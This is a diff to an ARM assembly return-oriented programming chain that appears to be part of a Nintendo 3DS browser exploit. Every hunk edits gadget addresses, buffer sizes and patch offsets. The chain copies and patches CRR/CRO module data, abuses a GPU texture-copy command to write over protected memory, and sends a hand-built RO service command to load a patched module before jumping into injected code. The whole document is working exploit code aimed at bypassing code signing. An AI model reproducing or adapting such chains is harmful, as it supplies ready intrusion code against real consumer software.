@@ -72,8 +72,8 @@ thread0rop:
 		;copy piece that'll have to be patched
 			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
 				.word SPIDER_GSPHEAPBUF ; r0 (dst)
-				.word SPIDER_CRRLOCATION+0x360 ; r1 (src)
-				.word 0x200  ; r2 (size)
+				.word SPIDER_CRRLOCATION ; r1 (src)
+				.word 0x1000  ; r2 (size)
 				.word 0xDEADC0DE ; r3 (garbage)
 				.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
@@ -138,7 +138,7 @@ thread0rop:
 	;patch crr
 		;copy patch
 			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-				.word SPIDER_GSPHEAPBUF ; r0 (dst)
+				.word SPIDER_GSPHEAPBUF+0x360 ; r0 (dst)
 				.word SPIDER_THREAD0ROP_VADR+crrPatch ; r1 (src)
 				.word crrPatch_end-crrPatch  ; r2 (size)
 				.word 0xDEADC0DE ; r3 (garbage)
@@ -157,7 +157,7 @@ thread0rop:
 				.word SPIDER_GSPHANDLE_ADR ; r0 (handle ptr)
 				.word 0xFFFF8001 ; r1 (kprocess handle)
 				.word SPIDER_GSPHEAPBUF  ; r2 (address)
-				.word 0x00000200 ; r3 (size)
+				.word 0x00001000 ; r3 (size)
 				.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002A5DC0 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
 				.word 0xDEADC0DE ; r4 (garbage)
@@ -231,7 +231,7 @@ thread0rop:
 
 	;patch cro (0x0 patch) (hashes)
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_CROLOCATION+0x0 ; r0 (dst)
+			.word SPIDER_CROLOCATION+CRO_PATCH0_OFFSET ; r0 (dst)
 			.word SPIDER_THREAD0ROP_VADR+croPatch0 ; r1 (src)
 			.word croPatch0_end-croPatch0  ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -247,7 +247,7 @@ thread0rop:
 
 	;patch cro (0x700 patch) (ro code)
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_CROLOCATION+0x700 ; r0 (dst)
+			.word SPIDER_CROLOCATION+CRO_PATCH1_OFFSET ; r0 (dst)
 			.word SPIDER_THREAD0ROP_VADR+croPatch700 ; r1 (src)
 			.word croPatch700_end-croPatch700  ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -263,7 +263,7 @@ thread0rop:
 
 	;patch cro (0x2000 patch) (spider code)
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_CROLOCATION+0x2000 ; r0 (dst)
+			.word SPIDER_CROLOCATION+CRO_PATCH2_OFFSET ; r0 (dst)
 			.word SPIDER_THREAD0ROP_VADR+croPatch2000 ; r1 (src)
 			.word croPatch2000_end-croPatch2000  ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -279,7 +279,7 @@ thread0rop:
 
 	;patch cro (0x1D9020 patch) (rohax stuff)
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_CROLOCATION+0x1D9020 ; r0 (dst)
+			.word SPIDER_CROLOCATION+CRO_PATCH3_OFFSET ; r0 (dst)
 			.word SPIDER_THREAD0ROP_VADR+croPatch1D9020 ; r1 (src)
 			.word croPatch1D9020_end-croPatch1D9020  ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -295,7 +295,7 @@ thread0rop:
 
 	;patch cro (0x1DBA90 patch) (rohax stuff)
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_CROLOCATION+0x1DBA90 ; r0 (dst)
+			.word SPIDER_CROLOCATION+CRO_PATCH4_OFFSET ; r0 (dst)
 			.word SPIDER_THREAD0ROP_VADR+croPatch1DBA90 ; r1 (src)
 			.word croPatch1DBA90_end-croPatch1DBA90  ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -311,41 +311,43 @@ thread0rop:
 
 	;load cro
 
-		; CMD 0x402c2 (0x210032) 0x11d668  0xfff13490
-		;     ['0x83a5000', '0x7e5000', '0x217000', '0x8381050', '0x0', '0x6630', '0x8387680', '0x338c', '0x1', '0x1', '0x0', '0xdead0032']
-
-		; R0 : &outval
-		; R1 : processHandle
-		; R2 : croBuffer
-		; R3 : mapaddr
-		; arg_0 : SPIDER_croSize
-		; arg_4 : r6 data1addr
-		; arg_8 : r7 usually zero ?
-		; arg_C : r8 a
-		; arg_10 : r9 data2addr
-		; arg_14 : r10 0xbaff1c8
-		; arg_18 : 0x00 ?
-		; arg_1C : r11 0x00000000
-		; arg_20 : lr 0x00000000
-
-		.word 0x00279a28 ; pop {lr, pc}
-			.word 0x002601FC ; lr (LDMFD   SP!, {R4-R12,PC})
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r0 (outval)
-			.word 0xFFFF8001 ; r1 (process handle)
-			.word SPIDER_CROLOCATION ; r2 (cro buffer)
-			.word SPIDER_CROMAPADR ; r3 (cro map addr)
+			.word 0xDEADC0DE ; r0 (dst, overwritten right after)
+			.word SPIDER_THREAD0ROP_VADR+roCommand ; r1 (src)
+			.word endRoCommand-roCommand  ; r2 (size)
+			.word 0xDEADC0DE ; r3 (garbage)
+			.word 0x80-0x5c ; r4 (offset to get to cmd buffer)
+		.word 0x00279a28 ; pop {lr, pc}
+			.word 0x00285624 ; lr (pop {pc})
+		.word 0x00268aa4 ; mrc	15, 0, r0, cr13, cr0, {3} | add	r0, r0, #0x5c | bx	lr
+		.word 0x002994f4 ; add r0, r0, r4 | pop {r4, pc}
 			.word 0xDEADC0DE ; r4 (garbage)
-		.word 0x00273124 ; RO_LoadAndFixCRO ; TODO : UPDATE !
-			.word SPIDER_CROSIZE ; arg_0 (SPIDER_CROSIZE) (r4)
-			.word CRO_RELOCATION_OFFSET ; arg_4 (data1addr) (r5)
-			.word 0x00000000 ; arg_8 (r6)
-			.word 0x00006630 ; arg_C (a) (r7)
-			.word 0x08387680 ; arg_10 (dataaddr2) (r8)
-			.word 0x0000338c ; arg_14 (r9)
-			.word 0x00000001 ; arg_18 (r10)
-			.word 0x00000001 ; arg_1C (r11)
-			.word 0x00000000 ; arg_20 (r12)
+		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
+			.word 0xDEADC0DE ; r7 (garbage)
+			.word 0xDEADC0DE ; r8 (garbage)
+			.word 0xDEADC0DE ; r9 (garbage)
+			.word 0xDEADC0DE ; r10 (garbage)
+		.word 0x002954e8 ; pop {r0, pc}
+			.word SPIDER_ROHANDLE_ADR ; r0 (handle ptr)
+		.word 0x00368520 ; ldr r0, [r0] | pop {r4, pc}
+			.word 0xDEADC0DE ; r4 (garbage)
+		.word 0x00279a28 ; pop {lr, pc}
+			.word 0x00285624 ; lr (pop {pc})
+		.word 0x001EA320 ; send command (ends in bx lr)
+
+		; ;get error
+		; 	.word 0x00279a28 ; pop {lr, pc}
+		; 		.word 0x00285624 ; lr (pop {pc})
+		; 	.word 0x00268aa4 ; mrc	15, 0, r0, cr13, cr0, {3} | add	r0, r0, #0x5c | bx	lr
+		; 	.word 0x002994f8 ; pop {r4, pc}
+		; 		.word 0x80-0x5c+4 ; r4 (offset to get to cmd buffer)
+		; 	.word 0x002994f4 ; add r0, r0, r4 | pop {r4, pc}
+		; 		.word 0xDEADC0DE ; r4 (garbage)
+		; 	.word 0x00368520 ; ldr r0, [r0] | pop {r4, pc}
+		; 		.word 0xDEADC0DE ; r4 (garbage)
 
 		;jump to code
 		.word SPIDER_CROMAPADR+CRO_SPIDERCODE_OFFSET
@@ -375,12 +377,32 @@ thread0rop:
 	gxCommand:
 		.word 0x00000004 ;command header (SetTextureCopy)
 		.word SPIDER_GSPHEAPBUF ;source address
-		.word SPIDER_GSPHEAP+SPIDER_CRRLOCATIONPA+0x360-0x20000000 ;destination address
-		.word 0x00000200 ;size
+		.word SPIDER_GSPHEAP+SPIDER_CRRLOCATIONPA-0x20000000 ;destination address
+		.word 0x00001000 ;size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
 		.word 0x00000008 ; flags
 		.word 0x00000000 ; unused
+
+	.align 0x4
+	roCommand:
+		.word 0x000402c2
+		.word SPIDER_CROLOCATION
+		.word SPIDER_CROMAPADR
+		.word SPIDER_CROSIZE
+		.word CRO_RELOCATION_OFFSET
+		.word 0x00000000
+		.word 0x00007160
+		.word CRO_RELOCATION_OFFSET
+		.word 0x0000338C
+		.word 0x00000001
+		.word 0x00000001
+		.word 0x00000000
+		.word 0x00000000
+		.word 0xFFFF8001
+		.word 0x00000000
+		.word 0x00000000
+	endRoCommand:
 
 	.align 0x4
 	crrPatch:
